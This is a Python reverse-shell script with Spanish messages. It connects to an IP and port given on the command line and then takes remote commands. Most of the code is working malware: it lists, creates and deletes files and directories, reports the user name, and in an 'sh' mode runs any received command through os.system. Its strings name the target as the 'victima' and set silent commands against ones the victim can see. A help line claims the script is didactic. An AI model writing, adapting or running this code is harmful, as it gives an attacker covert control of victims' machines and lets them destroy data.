#!/user/bin/python
#-*- coding: utf-8 -*-
import subprocess
import os
import getpass
import time
import itertools
from socket import *
from sys import argv

def ls():
	lsstring = ""
	for f in os.listdir("."):
		lsstring += "{}\n".format(f)
	sock.send(lsstring.encode())	
def whoami():
	sock.send(getpass.getuser().encode())

def mkdir(mdir):
	try:
	    os.mkdir(mdir)
	except: 
		sock.send("No se ha podido crear el directorio.".encode()) 
	else:
		sock.send("El directorio se ha creado correctamente.".encode())
def cd(cdir): 
	try:
		os.chdir(cdir)
	except:
		sock.send("El sistema no puede encontrar la ruta.".encode())
	else:
		sock.send(os.getcwd().encode())

def rm(path):
	try:
		os.remove(path)
	except:
		sock.send(("[ERROR]: '{}' no encontrado".format(path).encode()))
	else:
		sock.send("Se ha borrado correctamente.")


def find(file):
	findfile = os.listdir(".")
	fcount = 1
	for f in findfile:
		if f == file:
			sock.send(f.encode())
			break
		else:
			fcount += 1
	if fcount > len(findfile):
		sock.send("find: '{}': no encontrado".format(file).encode())

def pwd():
	sock.send("\n{}\n".format(os.getcwd()).encode())
def rmdir(cmd):
	try:
		os.rmdir(cmd[6:])
	except:
		sock.send("No se ha podido borrar '{}'.".format(cmd[6:]).encode())
	else:
		sock.send("Se ha eliminado con exito.".encode())
def touch(cmd):
	try:
		touch_file = open(cmd[6:], "w")
		touch_file.close()
	except:
		sock.send("Han habido problemas al ejecutar el comando".encode())
	else:
		sock.send("Se ha ejecutado el comando con exito".encode())

		
def h():
	print("Este programa fue creado con fines didacticos, el mal uso dado es responsabilidad del usuario.")
	print("-i: Aquí debes de poner la ip de a donde se va a conectar..")
	print("-p: Puerto por el que se va a conectar.")
	exit()

if __name__ == '__main__':
	if len(argv) < 5 or len(argv) > 5:
	    h()
	else:
		argcount = 0
		ip = str()
		port = 0
		for arg in argv:
			if arg[0] != "-":
				argcount += 1
				continue
			elif arg == "-h":
				h()
			elif arg == "-p":
				try:
					port = int(argv[argcount + 1])
				except:
					print("{} no es un numero valido.".format(argv[argcount + 1]))
					exit()
			elif arg == "-i":
				ip = str(argv[argcount + 1])
			else:
				print("{} no se reconoce como una bandera valida.".format(arg))
				exit()
			argcount += 1
		try:
			sock = socket(AF_INET, SOCK_STREAM)
			sock.connect((ip, port))
		except Exception as e:
			print("No se ha podido conectar a {} por el puerto {}.\n".format(ip, port, e))
			exit()
		else:
			sh = False
			while True:
				cmd = sock.recv(1024).decode()
				if cmd == "sh":
					sh = True
					sock.send("Ahora puedes ejecutar cualquier comando, pero la victima puede verlo.".encode())
					continue
				elif cmd == "exit-sh":
					sh = False
					sock.send("Ahora los comandos son invisibles para la victima, pero están limitados.".encode())
					continue
				if sh == False:
					if cmd[:3] == "dir":
						ls()
					elif cmd [:2] == "ls":
						ls()
					elif cmd[:5] == "mkdir":
						mkdir(cmd[6:])
					elif cmd[:2] == "cd":
						cd(cmd[3:])
					elif cmd[:2] == "rm" and cmd[2] == " ":
						rm(cmd[3:])
					elif cmd[:5] == "touch":
						touch(cmd)
					elif cmd[:3] == "pwd":
						pwd()
					elif cmd[:4] == "find":
						find(cmd[5:])
					elif cmd[:5] == "rmdir":
						rmdir(cmd)
					elif cmd[:7] == "whoami":
						whoami()
					else:
						sock.send("comando '{}' no reconocido".format(cmd).encode())
				else:
					try:
						os.system(cmd)
					except:
						sock.send("No se ha podido ejecutar el comando".encode())
					else:
						sock.send("Se ha ejecutado el comando".encode())
